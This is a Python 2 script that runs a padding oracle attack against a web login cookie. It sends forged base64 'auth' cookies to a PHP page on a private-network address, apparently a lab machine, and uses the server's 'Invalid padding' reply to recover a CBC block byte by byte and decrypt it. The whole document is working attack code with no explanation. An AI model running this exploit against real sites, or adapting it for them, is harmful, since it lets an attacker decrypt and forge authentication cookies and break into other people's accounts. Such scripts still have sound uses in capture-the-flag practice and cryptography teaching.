import urllib2
import urllib
import base64
import binascii

# proxy = urllib2.ProxyHandler({'http': '127.0.0.1:8080'})
# opener = urllib2.build_opener(proxy)
# urllib2.install_opener(opener)

url = "http://192.168.56.104/index.php"
intm = "\x00\x00\x00\x00\x00\x00\x00\x00"

# Target decrypt block
prepend = "\x10\x1f\x84\x95\x33\x3c\xc1\xab"
# Previous block
enc = "\x18\xc9\x9b\xbd\x2a\xe7\x5a\x19"

padpos = 0x01

for pos in range(8, 0, -1):
    #pos = 8
    print "Get position: " + str(pos)
    for i in range(0, 256):
        #ch = enc[-1:]
        s = ""
        for j in range(pos, 8):
            #print binascii.hexlify(intm[j]),
            #s = s + chr(ord(intm[j]) ^ (0x00 + (8-j)))
            s = s + chr(ord(intm[j]) ^ padpos)
        #print "s: "  + binascii.hexlify(s)
        tmp = enc[:pos-1] + chr(i) + s
        #print binascii.hexlify(tmp)
        pl = base64.b64encode(tmp + prepend)
        cookie = {"auth": pl}
        #break

        req = urllib2.Request(url)
        req.add_header('Cookie', urllib.urlencode(cookie))
        res = urllib2.urlopen(req)
        content = res.read()
        if content != "Invalid padding":

            intm = intm[:pos-1] + chr(i ^ padpos) + intm[pos:]
            padpos = padpos + 1
            print "intermediate: " + binascii.hexlify(intm)
            #print content
            #print binascii.hexlify(chr(padpos))
            break
        #else:
            #print content

#print "intermediate: " + binascii.hexlify(intm)
p = ""
for i in range(0, 8):
    p = p + chr(ord(enc[i]) ^ ord(intm[i]))
#print binascii.hexlify(p)
print p
